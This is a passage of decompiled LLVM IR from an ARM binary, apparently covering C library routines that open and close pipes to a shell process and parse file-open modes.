  %v0_d0ec = call i32 @function_d800()
  %v0_d0f0 = load i32, i32* @r4, align 4
  %v1_d0f0 = load i32, i32* @r5, align 4
  %v2_d0f0 = add i32 %v1_d0f0, %v0_d0f0
  %v0_d0f8 = load i32, i32* @r7, align 4
  %v0_d0fc = load i32, i32* @r8, align 4
  %v0_d108 = load i32, i32* @sl, align 4
  %v12_d11c = inttoptr i32 %v0_d0f8 to i8*
  %v13_d11c = call i32 @function_d9c8(i32 %v2_d0a8, i8* %v12_d11c, i32 %v0_d0fc, i32 %v2_d0f0, i32 %v0_d0f0, i32 %v2_d0f0, i32 %v0_d0f0, i32 %v0_d0f0, i32 %v0_d0f0, i32 %v2_d0f0, i32 %v0_d108)
  %v0_d120 = load i32, i32* @r5, align 4
  %v1_d120 = load i32, i32* @sl, align 4
  %v9_d120 = icmp eq i32 %v0_d120, %v1_d120
  br i1 %v9_d120, label %dec_label_pc_d148, label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %bb23
  %v9_d134 = icmp eq i32 %v1_d0f0, 0
  %v1_d138 = sext i1 %v9_d134 to i32
  %v1_d138.v0_d100 = add i32 %v0_d0f0, %v1_d138
  %stack_var_-92.0 = inttoptr i32 %v1_d138.v0_d100 to i8*
  %v1_d144 = trunc i32 %v1_d120 to i8
  store i8 %v1_d144, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_d148

dec_label_pc_d148:                                ; preds = %bb23, %dec_label_pc_d12c
  store i32 %v3_d0a0, i32* @r4, align 4
  store i32 %v6_d0a0, i32* @r5, align 4
  store i32 %v12_d0a0, i32* @r7, align 4
  store i32 %v15_d0a0, i32* @r8, align 4
  store i32 %v18_d0a0, i32* @sl, align 4
  ret i32 %v13_d11c

; uselistorder directives
  uselistorder i32 %v1_d0f0, { 1, 0 }
  uselistorder i32 %v0_d0f0, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_d0c4, { 1, 0 }
  uselistorder i32 %v0_d0b0, { 1, 0 }
  uselistorder label %dec_label_pc_d148, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @function_d150(i32 %arg1) local_unnamed_addr {
dec_label_pc_d150:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_d150 = load i32, i32* @r4, align 4
  %v2_d154 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %v2_d154, i32* @r0, align 4
  %v1_d170 = call i32 @function_10d54()
  %v1_d180 = call i32 @function_10d4c()
  %v2_d188 = load i32, i32* @global_var_20a68.301, align 4
  store i32 %v2_d188, i32* %r4.global-to-local, align 4
  %v2_d18c = icmp eq i32 %v2_d188, 0
  br i1 %v2_d18c, label %dec_label_pc_d1d4, label %dec_label_pc_d1c0.preheader

dec_label_pc_d1c0.preheader:                      ; preds = %dec_label_pc_d150
  %v1_d1c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d1c0

dec_label_pc_d198:                                ; preds = %dec_label_pc_d1b0
  %v0_d198 = call i32 @function_cec4()
  %v2_d1a0 = inttoptr i32 %v0_d198 to i32*
  store i32 22, i32* %v2_d1a0, align 4
  br label %dec_label_pc_d1d4

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d204
  %v3_d1a8 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_d230

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d1c0
  %v1_d1b4 = inttoptr i32 %v0_d1cc to i32*
  %v2_d1b4 = load i32, i32* %v1_d1b4, align 4
  store i32 %v2_d1b4, i32* %r4.global-to-local, align 4
  %v2_d1b8 = icmp eq i32 %v2_d1b4, 0
  br i1 %v2_d1b8, label %dec_label_pc_d198, label %dec_label_pc_d1c0

dec_label_pc_d1c0:                                ; preds = %dec_label_pc_d1c0.preheader, %dec_label_pc_d1b0
  %v1_d1d0 = phi i32 [ ptrtoint (i32* @global_var_20a68.301 to i32), %dec_label_pc_d1c0.preheader ], [ %v0_d1cc, %dec_label_pc_d1b0 ]
  %v0_d1cc = phi i32 [ %v2_d188, %dec_label_pc_d1c0.preheader ], [ %v2_d1b4, %dec_label_pc_d1b0 ]
  %v1_d1c0 = add i32 %v0_d1cc, 4
  %v2_d1c0 = inttoptr i32 %v1_d1c0 to i32*
  %v3_d1c0 = load i32, i32* %v2_d1c0, align 4
  %v9_d1c4 = icmp eq i32 %v3_d1c0, %v1_d1c4.pre
  br i1 %v9_d1c4, label %dec_label_pc_d1cc, label %dec_label_pc_d1b0

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d1c0
  %v1_d1cc = inttoptr i32 %v0_d1cc to i32*
  %v2_d1cc = load i32, i32* %v1_d1cc, align 4
  %v2_d1d0 = inttoptr i32 %v1_d1d0 to i32*
  store i32 %v2_d1cc, i32* %v2_d1d0, align 4
  br label %dec_label_pc_d1d4

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d150, %dec_label_pc_d198, %dec_label_pc_d1cc
  store i32 %v2_d154, i32* @r0, align 4
  store i32 53736, i32* @lr, align 4
  %v1_d1e4 = call i32 @function_10d54()
  %v0_d1e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1e8 = icmp eq i32 %v0_d1e8, 0
  br i1 %v2_d1e8, label %dec_label_pc_d230, label %dec_label_pc_d1f0

dec_label_pc_d1f0:                                ; preds = %dec_label_pc_d1d4
  store i32 %v0_d1e8, i32* @r0, align 4
  %v1_d1f4 = add i32 %v0_d1e8, 8
  %v2_d1f4 = inttoptr i32 %v1_d1f4 to i32*
  %v3_d1f4 = load i32, i32* %v2_d1f4, align 4
  store i32 %v3_d1f4, i32* @r4, align 4
  %v0_d1f8 = call i32 @function_fdcc()
  %v0_d1fc = load i32, i32* @r5, align 4
  %v1_d200 = inttoptr i32 %v0_d1fc to i8*
  %v2_d200 = call i32 @function_ced0(i8* %v1_d200)
  %v2_d204 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_d204

dec_label_pc_d204:                                ; preds = %dec_label_pc_d21c, %dec_label_pc_d1f0
  store i32 %v2_d204, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* @r0, align 4
  %v3_d210 = call i32 @function_ce5c(i32 %v0_d20c, i32 %v2_d204, i32 0)
  %v1_d214 = icmp slt i32 %v3_d210, 0
  br i1 %v1_d214, label %dec_label_pc_d21c, label %dec_label_pc_d1a8

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d204
  %v0_d21c = call i32 @function_cec4()
  %v1_d220 = inttoptr i32 %v0_d21c to i32*
  %v2_d220 = load i32, i32* %v1_d220, align 4
  %v7_d224 = icmp eq i32 %v2_d220, 4
  br i1 %v7_d224, label %dec_label_pc_d204, label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d21c, %dec_label_pc_d1d4, %dec_label_pc_d1a8
  %storemerge = phi i32 [ %v3_d1a8, %dec_label_pc_d1a8 ], [ -1, %dec_label_pc_d1d4 ], [ -1, %dec_label_pc_d21c ]
  store i32 %v3_d150, i32* %r4.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_d1e8, { 1, 0, 2 }
  uselistorder i32 %v0_d1cc, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_ce5c, { 1, 0 }
  uselistorder label %dec_label_pc_d1d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d1c0, { 1, 0 }
}

define i32 @function_d250(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_d250:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d250 = load i32, i32* @r4, align 4
  store i32 %v3_d250, i32* %stack_var_-20, align 4
  %v16_d250 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d254 = load i8, i8* %arg2, align 1
  %v4_d254 = zext i8 %v3_d254 to i32
  store i32 %v4_d254, i32* %r3.global-to-local, align 4
  %v7_d25c = icmp eq i8 %v3_d254, 119
  store i32 %tmp, i32* @r4, align 4
  %v0_d264 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_d25c, label %dec_label_pc_d294, label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d250
  %v7_d26c = icmp eq i8 %v3_d254, 114
  br i1 %v7_d26c, label %bb, label %dec_label_pc_d27c

bb:                                               ; preds = %dec_label_pc_d26c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d29c

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d26c
  %v0_d27c = call i32 @function_cec4()
  store i32 %v0_d27c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_d28c = inttoptr i32 %v0_d27c to i32*
  store i32 22, i32* %v2_d28c, align 4
  br label %dec_label_pc_d468

dec_label_pc_d294:                                ; preds = %dec_label_pc_d250
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d29c

dec_label_pc_d29c:                                ; preds = %bb, %dec_label_pc_d294
  %v0_d368 = phi i32 [ 0, %dec_label_pc_d294 ], [ 1, %bb ]
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_d2a0 = call i32 @function_fc78(i32 12)
  store i32 %v1_d2a0, i32* %r0.global-to-local, align 4
  %v2_d2a4 = icmp eq i32 %v1_d2a0, 0
  br i1 %v2_d2a4, label %dec_label_pc_d468, label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d29c
  %v2_d2b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d2b4, i32* %r0.global-to-local, align 4
  %v1_d2b8 = call i32 @function_11410(i32 %v2_d2b4)
  store i32 %v1_d2b8, i32* %r0.global-to-local, align 4
  %v2_d2bc = icmp eq i32 %v1_d2b8, 0
  br i1 %v2_d2bc, label %dec_label_pc_d2c4, label %dec_label_pc_d458

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2b4
  store i32 %v16_d250, i32* %r0.global-to-local, align 4
  %v1_d2cc = xor i32 %v0_d368, 1
  store i32 -8, i32* @r2, align 4
  %tmp23 = sub nsw i32 0, %v1_d2cc
  %v4_d2d4 = and i32 %tmp23, 4
  %v5_d2d4 = add i32 %v4_d2d4, %v16_d250
  store i32 %v5_d2d4, i32* %r3.global-to-local, align 4
  %v2_d2d8 = add i32 %v5_d2d4, -8
  %v3_d2d8 = inttoptr i32 %v2_d2d8 to i32*
  %v4_d2d8 = load i32, i32* %v3_d2d8, align 4
  %tmp24 = sub nsw i32 0, %v0_d368
  %v4_d2e0 = and i32 %tmp24, 4
  %v5_d2e0 = add i32 %v4_d2e0, %v16_d250
  store i32 %v5_d2e0, i32* %r3.global-to-local, align 4
  %v2_d2e4 = add i32 %v5_d2e0, -8
  %v3_d2e4 = inttoptr i32 %v2_d2e4 to i32*
  %v4_d2e4 = load i32, i32* %v3_d2e4, align 4
  store i32 %v4_d2e4, i32* %r3.global-to-local, align 4
  %v0_d2e8 = load i32, i32* @r4, align 4
  store i32 %v4_d2d8, i32* %r0.global-to-local, align 4
  %v7_d2f4 = call i32 @function_1164c(i32 %v4_d2d8, i32 %v0_d2e8, i32 -8, i32 %v4_d2e4, i32 %v4_d2d8, i32 %v4_d2e4)
  store i32 %v7_d2f4, i32* %r0.global-to-local, align 4
  %v2_d2f8 = icmp eq i32 %v7_d2f4, 0
  br i1 %v2_d2f8, label %dec_label_pc_d304, label %dec_label_pc_d318

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2c4
  store i32 %v4_d2d8, i32* %r0.global-to-local, align 4
  %v1_d308 = call i32 @function_cbe4(i32 %v4_d2d8)
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v1_d310 = call i32 @function_cbe4(i32 %v4_d2e4)
  store i32 %v1_d310, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d458

dec_label_pc_d318:                                ; preds = %dec_label_pc_d2c4
  store i32 ptrtoint (i32* @global_var_20a50.296 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_20a50.296 to i32), i32* %r2.global-to-local, align 4
  %v2_d324 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d324, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_d330 = call i32 @function_10d54()
  %v0_d334 = load i32, i32* @r4, align 4
  store i32 %v0_d334, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_d340 = call i32 @function_10d4c()
  store i32 %v1_d340, i32* %r0.global-to-local, align 4
  %v1_d344 = call i32 @function_11120(i32 %v1_d340)
  store i32 %v1_d344, i32* %r0.global-to-local, align 4
  store i32 %v1_d344, i32* @r5, align 4
  %v2_d348 = icmp eq i32 %v1_d344, 0
  br i1 %v2_d348, label %dec_label_pc_d350, label %dec_label_pc_d3c0

dec_label_pc_d350:                                ; preds = %dec_label_pc_d318
  store i32 %v4_d2d8, i32* %r0.global-to-local, align 4
  %v1_d354 = call i32 @function_cbe4(i32 %v4_d2d8)
  store i32 %v1_d354, i32* %r0.global-to-local, align 4
  store i32 %v0_d368, i32* %r2.global-to-local, align 4
  %v9_d360 = icmp eq i32 %v4_d2e4, %v0_d368
  br i1 %v9_d360, label %dec_label_pc_d37c, label %dec_label_pc_d368

dec_label_pc_d368:                                ; preds = %dec_label_pc_d350
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v2_d370 = call i32 @function_11270(i32 %v4_d2e4, i32 %v0_d368)
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v1_d378 = call i32 @function_cbe4(i32 %v4_d2e4)
  store i32 %v1_d378, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d350, %dec_label_pc_d368
  store i32 ptrtoint (i32* @global_var_20a68.301 to i32), i32* %r3.global-to-local, align 4
  %storemerge3 = load i32, i32* @global_var_20a68.301, align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_d3985 = icmp eq i32 %storemerge3, 0
  br i1 %v2_d3985, label %dec_label_pc_d3a0, label %dec_label_pc_d388

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d388
  %v0_d388 = phi i32 [ %storemerge, %dec_label_pc_d388 ], [ %storemerge3, %dec_label_pc_d37c ]
  %v1_d388 = add i32 %v0_d388, 4
  %v2_d388 = inttoptr i32 %v1_d388 to i32*
  %v3_d388 = load i32, i32* %v2_d388, align 4
  store i32 %v3_d388, i32* %r3.global-to-local, align 4
  %v1_d38c = add i32 %v3_d388, 4
  %v2_d38c = inttoptr i32 %v1_d38c to i32*
  %v3_d38c = load i32, i32* %v2_d38c, align 4
  store i32 %v3_d38c, i32* %r0.global-to-local, align 4
  %v1_d390 = call i32 @function_cbe4(i32 %v3_d38c)
  store i32 %v1_d390, i32* %r0.global-to-local, align 4
  %v0_d394 = load i32, i32* @r4, align 4
  %v1_d394 = inttoptr i32 %v0_d394 to i32*
  %storemerge = load i32, i32* %v1_d394, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_d398 = icmp eq i32 %storemerge, 0
  br i1 %v2_d398, label %dec_label_pc_d3a0, label %dec_label_pc_d388

dec_label_pc_d3a0:                                ; preds = %dec_label_pc_d388, %dec_label_pc_d37c
  store i32 %v0_d264, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16e5c.309 to i32), i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16e68.313 to i32), i32* %r2.global-to-local, align 4
  %v8_d3b4 = call i32 @function_10aa8(i32 ptrtoint ([8 x i8]* @global_var_16e5c.309 to i32), i32 ptrtoint ([3 x i8]* @global_var_16e64.311 to i32), i32 ptrtoint ([3 x i8]* @global_var_16e68.313 to i32), i32 %v0_d264, i32 0)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_d3bc = call i32 @function_11248(i32 127)
  unreachable

dec_label_pc_d3c0:                                ; preds = %dec_label_pc_d318
  store i32 %v2_d324, i32* @r6, align 4
  store i32 %v2_d324, i32* @r0, align 4
  store i32 68948, i32* @r7, align 4
  %v1_d3d4 = call i32 @function_10d54()
  store i32 %v4_d2e4, i32* %r0.global-to-local, align 4
  %v1_d3dc = call i32 @function_cbe4(i32 %v4_d2e4)
  store i32 %v1_d3dc, i32* %r0.global-to-local, align 4
  %v0_d3e0 = load i32, i32* @r5, align 4
  %tmp26 = icmp slt i32 %v0_d3e0, 1
  br i1 %tmp26, label %dec_label_pc_d450, label %dec_label_pc_d3e8

dec_label_pc_d3e8:                                ; preds = %dec_label_pc_d3c0
  store i32 %v1_d2a0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a50.296 to i32), i32* %r4.global-to-local, align 4
  %v2_d3f4 = add i32 %v1_d2a0, 4
  %v3_d3f4 = inttoptr i32 %v2_d3f4 to i32*
  store i32 %v7_d2f4, i32* %v3_d3f4, align 4
  %v0_d3f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d3f8, i32* %r2.global-to-local, align 4
  %v0_d3fc = load i32, i32* @r5, align 4
  %v1_d3fc = load i32, i32* %r3.global-to-local, align 4
  %v2_d3fc = add i32 %v1_d3fc, 8
  %v3_d3fc = inttoptr i32 %v2_d3fc to i32*
  store i32 %v0_d3fc, i32* %v3_d3fc, align 4
  store i32 %v2_d324, i32* @r0, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  %v1_d410 = call i32 @function_10d54()
  %v0_d414 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d414, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  %v1_d420 = call i32 @function_10d4c()
  store i32 ptrtoint (i32* @global_var_20a68.301 to i32), i32* %r2.global-to-local, align 4
  %v2_d42c = load i32, i32* @global_var_20a68.301, align 4
  %v2_d430 = inttoptr i32 %v1_d2a0 to i32*
  store i32 %v2_d42c, i32* %v2_d430, align 4
  store i32 %v1_d2a0, i32* %r3.global-to-local, align 4
  store i32 %v2_d324, i32* @r0, align 4
  %v1_d440 = load i32, i32* %r2.global-to-local, align 4
  %v2_d440 = inttoptr i32 %v1_d440 to i32*
  store i32 %v1_d2a0, i32* %v2_d440, align 4
  %v1_d448 = call i32 @function_10d54()
  store i32 %v1_d448, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d468

dec_label_pc_d450:                                ; preds = %dec_label_pc_d3c0
  store i32 %v7_d2f4, i32* %r0.global-to-local, align 4
  %v1_d454 = inttoptr i32 %v7_d2f4 to i8*
  %v2_d454 = call i32 @function_ced0(i8* %v1_d454)
  store i32 %v2_d454, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d458

dec_label_pc_d458:                                ; preds = %dec_label_pc_d2b4, %dec_label_pc_d304, %dec_label_pc_d450
  store i32 %v1_d2a0, i32* @r0, align 4
  %v0_d45c = call i32 @function_fdcc()
  store i32 %v0_d45c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d29c, %dec_label_pc_d3e8, %dec_label_pc_d27c, %dec_label_pc_d458
  %stack_var_-64.1 = phi i32 [ 0, %dec_label_pc_d29c ], [ 0, %dec_label_pc_d458 ], [ %v7_d2f4, %dec_label_pc_d3e8 ], [ 0, %dec_label_pc_d27c ]
  store i32 %stack_var_-64.1, i32* %r0.global-to-local, align 4
  %v2_d470 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d470, i32* %r4.global-to-local, align 4
  ret i32 %stack_var_-64.1

; uselistorder directives
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v7_d2f4, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v4_d2e4, { 1, 0, 3, 2, 7, 6, 8, 5, 4, 10, 9, 11 }
  uselistorder i32 %v4_d2d8, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 %v1_d2a0, { 5, 1, 0, 2, 4, 3, 6, 7 }
  uselistorder i32 %v0_d368, { 1, 4, 3, 0, 2 }
  uselistorder i32 %v0_d264, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 9, 7, 3, 8, 11, 10, 12, 14, 13, 16, 15, 17, 19, 18, 31, 2, 20, 22, 21, 23, 32, 24, 25, 4, 26, 28, 27, 30, 29, 0, 1 }
  uselistorder i32* @global_var_20a68.301, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_20a68.301 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_20a50.296 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_d468, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d458, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d388, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d29c, { 1, 0 }
}

define i32 @function_d498(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d498:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d498 = load i32, i32* @r4, align 4
  store i32 %v3_d498, i32* %stack_var_-24, align 4
  %v6_d498 = load i32, i32* @r5, align 4
  %v9_d498 = load i32, i32* @r6, align 4
  %v15_d498 = load i32, i32* @r8, align 4
  %v3_d49c = load i8, i8* %arg2, align 1
  %v4_d49c = zext i8 %v3_d49c to i32
  store i32 %v4_d49c, i32* @ip, align 4
  %v7_d4a0 = icmp eq i8 %v3_d49c, 114
  store i1 %v7_d4a0, i1* %cpsr_z.global-to-local, align 1
  %v2_d4a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r5, align 4
  br i1 %v7_d4a0, label %dec_label_pc_d4fc, label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d498
  %v7_d4b8 = icmp eq i8 %v3_d49c, 119
  store i1 %v7_d4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4b8, label %bb, label %dec_label_pc_d4c4

bb:                                               ; preds = %dec_label_pc_d4b8
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_d500

dec_label_pc_d4c4:                                ; preds = %dec_label_pc_d4b8
  %v7_d4c4 = icmp eq i8 %v3_d49c, 97
  store i1 %v7_d4c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4c4, label %bb31, label %dec_label_pc_d4d0

bb31:                                             ; preds = %dec_label_pc_d4c4
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_d500

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d4c4, %dec_label_pc_d588, %dec_label_pc_d55c
  %v0_d4d0 = call i32 @function_cec4()
  store i32 %v0_d4d0, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_d4d8 = load i32, i32* @r8, align 4
  %v2_d4d8 = icmp eq i32 %v0_d4d8, 0
  store i1 %v2_d4d8, i1* %cpsr_z.global-to-local, align 1
  %v2_d4dc = inttoptr i32 %v0_d4d0 to i32*
  store i32 22, i32* %v2_d4dc, align 4
  br i1 %v2_d4d8, label %dec_label_pc_d750, label %dec_label_pc_d4e4

dec_label_pc_d4e4:                                ; preds = %dec_label_pc_d5ac._crit_edge, %dec_label_pc_d4d0
  %v0_d4e4 = load i32, i32* @r8, align 4
  %v1_d4e4 = add i32 %v0_d4e4, 1
  %v2_d4e4 = inttoptr i32 %v1_d4e4 to i8*
  %v3_d4e4 = load i8, i8* %v2_d4e4, align 1
  %v4_d4e4 = zext i8 %v3_d4e4 to i32
  store i32 %v4_d4e4, i32* %r3.global-to-local, align 4
  %v1_d4e8 = and i32 %v4_d4e4, 32
  %v2_d4e8 = icmp eq i32 %v1_d4e8, 0
  store i1 %v2_d4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d4e8, label %dec_label_pc_d750, label %dec_label_pc_d4f0

dec_label_pc_d4f0:                                ; preds = %dec_label_pc_d4e4
  store i32 %v0_d4e4, i32* @r0, align 4
  %v0_d4f4 = call i32 @function_fdcc()
  store i32 %v0_d4f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d750

dec_label_pc_d4fc:                                ; preds = %dec_label_pc_d498
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d500

dec_label_pc_d500:                                ; preds = %bb, %bb31, %dec_label_pc_d4fc
  %v1_d518 = phi i32 [ 577, %bb ], [ 1089, %bb31 ], [ 1, %dec_label_pc_d4fc ]
  %v2_d500 = add i32 %tmp, 1
  %v3_d500 = inttoptr i32 %v2_d500 to i8*
  %v4_d500 = load i8, i8* %v3_d500, align 1
  %v7_d504 = icmp eq i8 %v4_d500, 98
  store i1 %v7_d504, i1* %cpsr_z.global-to-local, align 1
  %v2_d500.tmp = select i1 %v7_d504, i32 %v2_d500, i32 %tmp
  store i32 %v2_d500.tmp, i32* %r3.global-to-local, align 4
  %v1_d510 = add i32 %v2_d500.tmp, 1
  %v2_d510 = inttoptr i32 %v1_d510 to i8*
  %v3_d510 = load i8, i8* %v2_d510, align 1
  %v4_d510 = zext i8 %v3_d510 to i32
  store i32 %v4_d510, i32* %r3.global-to-local, align 4
  %v7_d514 = icmp eq i8 %v3_d510, 43
  store i1 %v7_d514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d514, label %bb34, label %.thread4

bb34:                                             ; preds = %dec_label_pc_d500
  store i32 %v1_d518, i32* %r3.global-to-local, align 4
  %v2_d51c = add nuw nsw i32 %v1_d518, 1
  store i32 %v2_d51c, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_d500, %bb34
  %v2_d520 = icmp eq i32 %arg3, 0
  store i1 %v2_d520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d520, label %dec_label_pc_d528, label %dec_label_pc_d554

dec_label_pc_d528:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_d52c = call i32 @function_fc78(i32 80)
  store i32 %v1_d52c, i32* %r0.global-to-local, align 4
  store i32 %v1_d52c, i32* @r8, align 4
  %v3_d530 = icmp eq i32 %v1_d52c, 0
  store i1 %v3_d530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d530, label %dec_label_pc_d754, label %dec_label_pc_d538

dec_label_pc_d538:                                ; preds = %dec_label_pc_d528
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_d540 = add i32 %v1_d52c, 1
  %v4_d540 = inttoptr i32 %v3_d540 to i8*
  store i8 32, i8* %v4_d540, align 1
  %v0_d544 = load i32, i32* %r2.global-to-local, align 4
  %v1_d544 = load i32, i32* @r8, align 4
  %v2_d544 = add i32 %v1_d544, 8
  %v3_d544 = inttoptr i32 %v2_d544 to i32*
  store i32 %v0_d544, i32* %v3_d544, align 4
  %v0_d548 = load i32, i32* %r2.global-to-local, align 4
  %v1_d548 = trunc i32 %v0_d548 to i8
  %v2_d548 = load i32, i32* @r8, align 4
  %v3_d548 = inttoptr i32 %v2_d548 to i8*
  store i8 %v1_d548, i8* %v3_d548, align 1
  %v0_d54c = load i32, i32* @r8, align 4
  %v1_d54c = add i32 %v0_d54c, 56
  store i32 %v1_d54c, i32* @r0, align 4
  %v0_d550 = call i32 @function_d800()
  store i32 %v0_d550, i32* %r0.global-to-local, align 4
  %v0_d554.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d554

dec_label_pc_d554:                                ; preds = %.thread4, %dec_label_pc_d538
  %v0_d5ac = phi i32 [ %arg4, %.thread4 ], [ %v0_d554.pre, %dec_label_pc_d538 ]
  %v1_d554 = icmp slt i32 %v0_d5ac, 0
  %v2_d554 = icmp eq i32 %v0_d5ac, 0
  store i1 %v2_d554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d554, label %dec_label_pc_d5ac, label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d554
  %v0_d560 = load i32, i32* @r4, align 4
  %v2_d560 = and i32 %v0_d560, 131075
  %v1_d564 = add nuw nsw i32 %v2_d560, 1
  store i32 %v1_d564, i32* %r2.global-to-local, align 4
  %v0_d568 = load i32, i32* @r6, align 4
  %v1_d568 = add i32 %v0_d568, 1
